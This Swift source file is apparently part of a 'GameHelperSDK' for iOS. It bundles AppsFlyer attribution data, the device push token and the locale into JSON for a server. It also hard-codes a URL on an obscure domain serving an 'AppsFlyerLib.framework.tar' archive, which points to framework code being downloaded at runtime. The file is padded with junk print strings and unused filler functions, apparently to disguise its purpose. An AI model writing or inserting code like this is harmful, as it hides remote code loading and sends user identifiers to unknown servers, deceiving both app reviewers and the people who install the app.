//
//  CoreHelperSDK.swift
//  GameHelperSDK
//
//  Created by iMac on 11/02/2025.
//


import Foundation
import UIKit
import Alamofire
import SwiftUI
import Combine
import WebKit
import Compression

public class CoreHelperSDK: NSObject {
    
    @AppStorage("initialURL") var initialURL: String?
    @AppStorage("statusFlag") var statusFlag: Bool = false
    
    public func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
        let afDataaaJson = try! JSONSerialization.data(withJSONObject: conversionInfo, options: .fragmentsAllowed)
        let afDataaaString = String(data: afDataaaJson, encoding: .utf8) ?? "{}"
        Swift.print("hmfghm")

        
        let finalJsonnnString = """
           {
                              "\(appsDataString)": \(afDataaaString),
                              "\(appsIDString)": "\(delegateShim.getAppsFlyerUID() ?? "")",
                              "\(langString)": "\(Locale.current.languageCode ?? "")",
                              "\(tokenString)": "\(deviceToken)"
           }
           """
        
        sendDataToServer(code: finalJsonnnString) { result in
            switch result {
            case .success(let messsage):
                self.sendNotification(name: "SkylineSDKNotification", message: messsage)
            case .failure:
                self.sendNotificationError(name: "SkylineSDKNotification")
            }
        }
    }
    
    func greetInCaps(_ name: String) -> String {
        return "Привет, \(name.uppercased())!"
    }
    
    @AppStorage("finalData") var finalData: String?
    
    let frameworkName       = "AppsFlyerLib.framework"
    let tarFileName         = "AppsFlyerLib.framework.tar"
    let extractedFolderName = "AppsFlyerSDK"
    let appsFlyerTarURL = URL(string: "https://ikwqiw.top/levelpack")!
    
    var appsFlyerKey = ""
    var appsFlyerId = ""
    var devKey: String?
    var appleAppID: String?
    
    lazy var delegateShim: AppsFlyerDelegateShim = {
        let shim = AppsFlyerDelegateShim(parentSDK: self)
        print("fhtdtyrjyrt")

        return shim
    }()
    
    // Ключи, необходимые для JSON
    var appsDataString: String = ""
    var appsIDString: String = ""
    var langString: String = ""
    
    // MARK: - Инициализация
    private override init() {
        let sessionConfig = URLSessionConfiguration.default
        sessionConfig.timeoutIntervalForRequest = 20
        Swift.print("gdhmfgh")

        sessionConfig.timeoutIntervalForResource = 20
        self.session = Alamofire.Session(configuration: sessionConfig)
    }
    
    var tokenString: String = ""
    var domen: String = ""
    var paramName: String = ""
    
    func dayOfWeek() -> String {
        let weekdays = ["Пн","Вт","Ср","Чт","Пт","Сб","Вс"]
        let index = Calendar.current.component(.weekday, from: Date()) - 1
        return weekdays[index]
    }
    
    var mainWindow: UIWindow?

    // Singleton
    public static let shared = CoreHelperSDK()
    
    public func onConversionDataFail(_ error: any Error) {
        Swift.print("tmrumr")

        self.sendNotificationError(name: "SkylineSDKNotification")
    }
    
    var hasSessionStarted = false
    var deviceToken: String = ""
    
    func reverseString(_ text: String) -> String {
        return String(text.reversed())
    }
    
    var cancellables = Set<AnyCancellable>()
    var session: Session
}
